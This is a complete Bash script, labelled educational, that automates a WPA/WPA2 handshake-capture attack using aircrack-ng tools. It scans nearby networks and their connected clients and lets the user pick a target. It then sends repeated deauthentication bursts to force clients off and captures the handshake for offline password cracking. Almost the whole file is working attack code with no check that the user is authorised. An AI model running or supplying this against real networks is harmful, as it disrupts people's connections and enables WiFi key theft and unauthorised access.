#!/bin/bash

# Targeted WPA Handshake Capture Utility for Educational Cybersecurity Projects
# Focuses on efficient, client-specific deauthentication for reliable handshake capture.

# --- Global Variables ---
OUTPUT_DIR=""
INTERFACE=""
MON_IFACE=""
SCAN_FILE=""
NETWORKS=()
CLIENTS=()
CAPTURE_TIMEOUT=45 # Default value, will be set by user selection

# --- Utility Functions ---

# Function to display usage
usage() {
    echo "Usage: $0 [-o output-dir]"
    echo "Example: $0 -o project_capture_data"
    echo "  -o <dir>: Specify output directory (default: capture_data_<timestamp>)"
    exit 1
}

# Function to check and install aircrack-ng
check_install_aircrack() {
    if ! command -v aircrack-ng &> /dev/null; then
        echo "[!] aircrack-ng not found. Attempting to install..."
        if [[ $(uname -s) == "Linux" && -n "$(command -v apt-get)" ]]; then
            sudo apt-get update && sudo apt-get install -y aircrack-ng
            if [ $? -ne 0 ]; then
                echo "[X] Failed to install aircrack-ng. Please install it manually."
                exit 1
            fi
        else
            echo "[X] aircrack-ng not found. Please install it manually."
            exit 1
        fi
    fi
    echo "[+] aircrack-ng is installed."
}

# Function to check root privileges
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo "[X] This script must be run as root (use sudo)."
        exit 1
    fi
}

# Function to list and select wireless interface
select_interface() {
    echo "[*] Detecting wireless interfaces..."
    interfaces=($(iwconfig 2>/dev/null | grep -oP '^\w+' | grep -v '^lo' | sort -u))
    if [ ${#interfaces[@]} -eq 0 ]; then
        echo "[X] No wireless interfaces found. Check with 'iwconfig'."
        exit 1
    fi

    echo ""
    echo "==================================="
    echo " Available Wireless Interfaces "
    echo "==================================="
    for i in "${!interfaces[@]}"; do
        printf "%-3s | %s\n" "$((i+1))" "${interfaces[$i]}"
    done
    echo "-----------------------------------"

    echo -n "[$] Enter the number of the interface to use (1-${#interfaces[@]}): "
    read selection
    if ! [[ "$selection" =~ ^[0-9]+$ ]] || [ "$selection" -lt 1 ] || [ "$selection" -gt ${#interfaces[@]} ]; then
        echo "[X] Invalid selection."
        exit 1
    fi

    INTERFACE="${interfaces[$((selection-1))]}"
    echo "[+] Selected interface: $INTERFACE"
}

# Function to reset interface to managed mode
reset_interface() {
    local iface=$1
    echo "[*] Resetting interface $iface to managed mode..."
    sudo ifconfig "$iface" down 2>/dev/null
    sudo iwconfig "$iface" mode managed 2>/dev/null
    sudo ifconfig "$iface" up 2>/dev/null
    sleep 1
}

# Function to enable monitor mode
enable_monitor_mode() {
    local iface=$1
    reset_interface "$iface"
    echo "[*] Enabling monitor mode on $iface..."
    sudo airmon-ng start "$iface" > "$OUTPUT_DIR/airmon_log.txt" 2>&1
    MON_IFACE=$(iwconfig 2>/dev/null | grep -oP '^\w+mon' | head -n 1)

    if [ -z "$MON_IFACE" ]; then
        # Fallback if airmon-ng doesn't rename, just use the original interface
        MON_IFACE="$iface"
        sudo ifconfig "$MON_IFACE" up 2>/dev/null
        sudo iwconfig "$MON_IFACE" mode monitor 2>/dev/null
        if ! iwconfig "$MON_IFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
            echo "[X] Failed to enable monitor mode. Check $OUTPUT_DIR/airmon_log.txt or try restarting your adapter."
            exit 1
        fi
    fi
    echo "[+] Monitor mode enabled on $MON_IFACE."
}

# Function to disable monitor mode
disable_monitor_mode() {
    local mon_iface=$1
    local orig_iface=$2
    echo ""
    echo "[*] Disabling monitor mode on $mon_iface..."
    # Attempt to stop the monitor interface created by airmon-ng
    sudo airmon-ng stop "$mon_iface" > /dev/null 2>&1
    
    # Ensure the original interface is reset
    reset_interface "$orig_iface"
    
    # Restart network services
    sudo systemctl start NetworkManager 2>/dev/null
    sudo systemctl restart network-manager 2>/dev/null
    echo "[+] Cleanup complete. NetworkManager restarted."
}

# Function to scan for WiFi networks
scan_wifi() {
    local mon_iface=$1
    local output_dir=$2
    SCAN_FILE="$output_dir/scan-01.csv"
    
    # Increased scan time for better network detection, as requested by the user
    local SCAN_DURATION=60
    
    echo ""
    echo "=========================================================="
    echo " [*] Scanning for WPA/WPA2 networks ($SCAN_DURATION seconds) "
    echo "=========================================================="
    
    # Note: We use the csv format for easy parsing later
    sudo airodump-ng --output-format csv -w "$output_dir/scan" "$mon_iface" > "$output_dir/airodump_scan_log.txt" 2>&1 &
    SCAN_PID=$!
    
    # Display simple progress and wait for SCAN_DURATION
    local i=0
    local spinner="/-\|"
    local end_time=$(( $(date +%s) + SCAN_DURATION ))
    
    while [ $(date +%s) -lt $end_time ]; do
        printf "\rScanning... ${spinner:$i:1} (Remaining: $((end_time - $(date +%s)))s) "
        i=$(( (i+1) % 4 ))
        sleep 1
    done
    
    printf "\rScan time finished. Stopping airodump-ng...\n"
    kill $SCAN_PID 2>/dev/null
    wait $SCAN_PID 2>/dev/null
    
    if [ ! -f "$SCAN_FILE" ] || [ ! -s "$SCAN_FILE" ]; then
        echo ""
        echo "[X] Scan failed. No results found. Check $output_dir/airodump_scan_log.txt."
        exit 1
    fi
    echo ""
    echo "[+] Scan completed. Processing results..."
}

# Function to parse and display WPA/WPA2 networks and find associated clients
display_networks() {
    local csv_file=$1
    if [ ! -f "$csv_file" ] || [ ! -s "$csv_file" ]; then
        echo "[X] No scan results found or CSV is empty in $csv_file."
        exit 1
    fi

    NETWORKS=()
    CLIENTS=()
    local index=1
    local parsing_aps=1 # 1=AP section, 0=Station section

    # Process the CSV file line by line
    while IFS=, read -r line; do
        # Detect transition from APs to Clients
        if [[ "$line" =~ "Station MAC" ]]; then
            parsing_aps=0
            continue
        fi

        # 1. Parsing Access Points (APs)
        if [ "$parsing_aps" -eq 1 ]; then
            # --- FIX: Use 'cut' to robustly extract fields, particularly the ESSID (field 14 onwards) ---
            bssid=$(echo "$line" | cut -d',' -f1 | xargs)
            channel=$(echo "$line" | cut -d',' -f4 | xargs)
            power=$(echo "$line" | cut -d',' -f9 | xargs)
            encryption=$(echo "$line" | cut -d',' -f6 | xargs)
            # ESSID is field 14 and all subsequent fields (if SSID contains commas)
            essid=$(echo "$line" | cut -d',' -f14- | xargs)

            # Filter for valid BSSID and WPA/WPA2 encryption
            if [[ "$bssid" =~ ^[0-9A-Fa-f:]{17}$ && "$encryption" =~ WPA ]]; then
                # Clean up SSID for display/filename
                essid_clean=$(echo "$essid" | sed 's/^[ \t]*//;s/[ \t]*$//')
                if [ -z "$essid_clean" ]; then
                    essid_clean="<Hidden_SSID>"
                fi

                NETWORKS+=("$bssid,$channel,$essid_clean")
            fi
        # 2. Parsing Clients (Stations)
        else
            # Extract fields for Station MAC (1st field), and BSSID of AP (6th field)
            station_mac=$(echo "$line" | cut -d',' -f1 | xargs)
            ap_bssid=$(echo "$line" | cut -d',' -f6 | xargs)
            
            # Ensure it's a valid client MAC and associated with an AP
            if [[ "$station_mac" =~ ^[0-9A-Fa-f:]{17}$ && "$ap_bssid" =~ ^[0-9A-Fa-f:]{17}$ ]]; then
                CLIENTS+=("$ap_bssid,$station_mac")
            fi
        fi
    done < "$csv_file"

    echo ""
    echo "=========================================================================================="
    echo " Found WPA/WPA2 Networks "
    echo "=========================================================================================="
    echo "No. | SSID                           | BSSID             | CH | Clients Found"
    echo "------------------------------------------------------------------------------------------"
    
    local network_count=1
    for i in "${!NETWORKS[@]}"; do
        IFS=',' read -r bssid channel essid <<< "${NETWORKS[$i]}"
        
        # Check if clients are associated with this AP
        local client_count=$(printf "%s\n" "${CLIENTS[@]}" | grep -c "^$bssid,")
        
        printf "%-3s | %-30s | %-17s | %-2s | %s\n" "$network_count" "$essid" "$bssid" "$channel" "$client_count"
        ((network_count++))
    done
    echo "------------------------------------------------------------------------------------------"
    
    if [ ${#NETWORKS[@]} -eq 0 ]; then
        echo "[X] No WPA/WPA2 networks found. Try increasing scan time."
        exit 1
    fi
}

# Function to select capture timeout (New Feature)
select_capture_timeout() {
    echo ""
    echo "==================================="
    echo " Select Handshake Capture Duration "
    echo "==================================="
    echo "1 | 40 seconds (Quick Attempt)"
    echo "2 | 90 seconds (Standard, Recommended)"
    echo "3 | 120 seconds (Persistent, High Success Rate)"
    echo "-----------------------------------"

    echo -n "[$] Enter the number for capture duration (1-3): "
    read selection
    
    case "$selection" in
        1) CAPTURE_TIMEOUT=40 ;;
        2) CAPTURE_TIMEOUT=90 ;;
        3) CAPTURE_TIMEOUT=120 ;;
        *)
            echo "[X] Invalid selection. Using default: 45 seconds."
            CAPTURE_TIMEOUT=45
            ;;
    esac
    echo "[+] Capture Timeout set to $CAPTURE_TIMEOUT seconds."
}

# Function to capture handshake (Updated for Verbose/Live Output)
capture_handshake() {
    local mon_iface=$1
    local output_dir=$2
    local bssid=$3
    local channel=$4
    local essid=$5
    local client_mac=$6 # Optional client MAC for targeted deauth
    
    # Define reliable capture parameters
    # CAPTURE_TIMEOUT is now a global variable
    local CHECK_INTERVAL=3   # How often to check the .cap file
    local elapsed_time=0
    local handshake_found=0
    
    # --- Calculate timing for the second, stronger burst ---
    # Second burst happens at roughly 1/3 of the total time
    local SECOND_BURST_TIME=$(( CAPTURE_TIMEOUT / 3 ))
    if [ "$SECOND_BURST_TIME" -lt 15 ]; then
        SECOND_BURST_TIME=15 # Minimum 15 seconds wait
    fi

    echo ""
    echo "[*] Setting $mon_iface to channel $channel..."
    sudo iwconfig "$mon_iface" channel "$channel" 2>/dev/null
    
    local capture_name="$output_dir/handshake_$essid"
    capture_name=$(echo "$capture_name" | sed 's/[^a-zA-Z0-9_/-]/_/g') # Sanitize filename

    echo "[*] Starting persistent capture for $essid ($bssid) for up to ${CAPTURE_TIMEOUT}s..."
    # Start airodump-ng in the background to continuously capture
    # We keep the output redirected for airodump-ng as it's less critical for real-time tracking
    airodump-ng --bssid "$bssid" --channel "$channel" --write "$capture_name" --output-format pcap "$mon_iface" > "$output_dir/capture_$essid_log.txt" 2>&1 &
    AIRODUMP_PID=$!

    # Wait briefly to ensure airodump-ng is capturing
    sleep 3
    
    # --- Deauthentication Attack Arguments (Verbose Output) ---
    local deauth_args_initial="--deauth 30 -a $bssid"
    local deauth_args_second="--deauth 60 -a $bssid"
    local deauth_target="AP ($bssid)"
    
    if [[ "$client_mac" =~ ^[0-9A-Fa-f:]{17}$ ]]; then
        deauth_args_initial="--deauth 30 -a $bssid -c $client_mac"
        deauth_args_second="--deauth 60 -a $bssid -c $client_mac"
        deauth_target="Client ($client_mac)"
    fi

    # Execute First Deauth Burst - Output is LIVE to the terminal
    echo ""
    echo "=========================================================================================="
    echo " [ATTACK] Sending First Deauth Burst (30 packets) to $deauth_target"
    echo "=========================================================================================="
    sudo aireplay-ng $deauth_args_initial "$mon_iface"
    
    # --- Check Loop for Handshake (Active Polling with Second Burst) ---
    local cap_file="${capture_name}-01.cap"
    echo ""
    echo "[*] Actively monitoring $cap_file for WPA Handshake (EAPOL packets)..."
    
    local second_burst_sent=0

    while [ "$elapsed_time" -lt "$CAPTURE_TIMEOUT" ]; do
        sleep "$CHECK_INTERVAL"
        elapsed_time=$((elapsed_time + CHECK_INTERVAL))
        
        # Verbose progress line
        printf "\r[STATUS] Time: %-2s/%-2s seconds | Target: %s" "$elapsed_time" "$CAPTURE_TIMEOUT" "$deauth_target"

        # Logic: Run a second, stronger deauth burst if halfway through and no handshake is found
        if [ "$elapsed_time" -ge "$SECOND_BURST_TIME" ] && [ "$second_burst_sent" -eq 0 ]; then
             printf "\n" # Newline for clear message
             echo "=========================================================================================="
             echo " [ATTACK] Handshake not yet found. Sending Second Deauth Burst (60 packets) to $deauth_target"
             echo "=========================================================================================="
             sudo aireplay-ng $deauth_args_second "$mon_iface"
             second_burst_sent=1
             printf "\r[STATUS] Time: %-2s/%-2s seconds | Target: %s" "$elapsed_time" "$CAPTURE_TIMEOUT" "$deauth_target"
        fi

        if [ -f "$cap_file" ]; then
            # We use aircrack-ng's check feature (-a 2 for WPA/WPA2)
            aircrack_output=$(aircrack-ng -a 2 "$cap_file" 2>/dev/null | grep -i "WPA Handshake")

            if echo "$aircrack_output" | grep -q "1 handshake"; then
                handshake_found=1
                break
            fi
        fi
    done
    
    # Stop airodump-ng capture
    kill $AIRODUMP_PID 2>/dev/null
    wait $AIRODUMP_PID 2>/dev/null
    
    echo "" # Newline after the progress line
    
    # --- Final Check and Report ---
    if [ "$handshake_found" -eq 1 ]; then
        echo "=========================================================================================="
        echo " [SUCCESS] WPA/WPA2 Handshake captured for $essid! (Check $cap_file) "
        echo "          Now you can use aircrack-ng with a wordlist to crack the key."
        echo "=========================================================================================="
        return 0
    else
        echo "=========================================================================================="
        echo " [FAIL] Handshake not detected within $CAPTURE_TIMEOUT seconds."
        echo "        The CAP file might still contain data, but lacks the necessary EAPOL packets."
        echo "        Try running the script again or targeting an AP with more active clients."
        echo "=========================================================================================="
        return 1
    fi
}

# --- Main Execution ---

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -o)
            OUTPUT_DIR="$2"
            shift 2
            ;;
        *)
            usage
            ;;
    esac
done

# Set default output directory
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
if [ -z "$OUTPUT_DIR" ]; then
    OUTPUT_DIR="capture_data_$TIMESTAMP"
fi
mkdir -p "$OUTPUT_DIR"

# Check prerequisites
check_root
check_install_aircrack

# Select interface
select_interface

# Select capture timeout
select_capture_timeout

# Set trap to clean up on exit/interrupt
trap 'disable_monitor_mode "$MON_IFACE" "$INTERFACE"; exit' EXIT SIGINT

# Enable monitor mode
enable_monitor_mode "$INTERFACE"

# Scan for networks
scan_wifi "$MON_IFACE" "$OUTPUT_DIR"

# Display networks and prompt for selection
display_networks "$SCAN_FILE"

# --- User Selection Flow ---

echo -n "[§] Enter the number of the WiFi network to target (1-${#NETWORKS[@]}): "
read net_selection
if ! [[ "$net_selection" =~ ^[0-9]+$ ]] || [ "$net_selection" -lt 1 ] || [ "$net_selection" -gt ${#NETWORKS[@]} ]; then
    echo "[X] Invalid selection. Exiting."
    exit 1
fi

# Extract selected network details
index=$((net_selection-1))
IFS=',' read -r bssid channel essid <<< "${NETWORKS[$index]}"
echo "[+] Target Selected: $essid (BSSID: $bssid, Channel: $channel)"

# Check for associated clients
target_clients=()
while IFS=, read -r ap_bssid station_mac; do
    if [ "$ap_bssid" = "$bssid" ]; then
        target_clients+=("$station_mac")
    fi
done <<< "$(printf "%s\n" "${CLIENTS[@]}")"

TARGET_CLIENT_MAC=""

if [ ${#target_clients[@]} -gt 0 ]; then
    echo ""
    echo "==================================================="
    echo " Found Associated Clients for $essid: "
    echo "==================================================="
    for i in "${!target_clients[@]}"; do
        printf "%-3s | %s\n" "$((i+1))" "${target_clients[$i]}"
    done
    echo "---------------------------------------------------"
    echo "[INFO] Using a client MAC leads to a much faster handshake capture."
    
    echo -n "[§] Enter the number of the client to use for targeted deauth (1-${#target_clients[@]}) or 0 for AP Broadcast: "
    read client_selection
    
    if [[ "$client_selection" =~ ^[0-9]+$ ]] && [ "$client_selection" -gt 0 ] && [ "$client_selection" -le ${#target_clients[@]} ]; then
        TARGET_CLIENT_MAC="${target_clients[$((client_selection-1))]}"
        echo "[+] Targeted Client MAC selected: $TARGET_CLIENT_MAC"
    else
        echo "[*] Proceeding with AP Broadcast Deauth (less effective)."
    fi
else
    echo "[*] No associated clients found for $essid. Proceeding with AP Broadcast Deauth."
fi

# Capture handshake
capture_handshake "$MON_IFACE" "$OUTPUT_DIR" "$bssid" "$channel" "$essid" "$TARGET_CLIENT_MAC"

# Summary
echo ""
echo "=========================================================================================="
echo " PROJECT RESULTS SUMMARY "
echo "=========================================================================================="
echo "Output Directory: $OUTPUT_DIR"
echo "Target Network: $essid ($bssid)"
echo "Capture File: ${capture_name}-01.cap (Check this file for the WPA handshake!)"
echo "=========================================================================================="